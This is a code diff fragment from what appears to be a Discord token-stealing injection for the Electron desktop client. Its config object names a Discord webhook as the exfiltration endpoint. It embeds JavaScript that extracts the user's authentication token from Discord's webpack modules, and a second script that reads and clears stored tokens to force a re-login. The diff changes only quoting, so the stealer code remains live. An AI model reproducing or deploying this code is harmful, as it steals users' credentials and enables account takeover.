@@ -5,12 +5,12 @@ const electron = require("electron");
 const https = require("https");
 const queryString = require("querystring");
 
-var config = {
+let config = {
  webhook: "https://canary.discord.com/api/webhooks/1365804617744777279/ovBDwu1u3VSrD1H4x46qfuoNfpL8LAw8lI0DWfugeJBwbVrJYymafLiCPm137yMptnag",
- logout: "true",
+ "logout": "true",
  "logout-notify": "true",
  "init-notify": "true",
- disable_qrcode: "true",
+ "disable_qrcode": "true",
  get: {
   token: `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
   logout: `function getLocalStoragePropertyDescriptor() {const o = document.createElement("iframe");document.head.append(o);const e = Object.getOwnPropertyDescriptor(o.contentWindow, "localStorage");return o.remove(), e};Object.defineProperty(window, "localStorage", getLocalStoragePropertyDescriptor());const localStorage = getLocalStoragePropertyDescriptor().get.call(window);console.log(localStorage.token);if(localStorage.token) {localStorage.token = null,localStorage.tokens = null,localStorage.MultiAccountStore = null,location.reload();} else {return"This is an intentional error";}`,
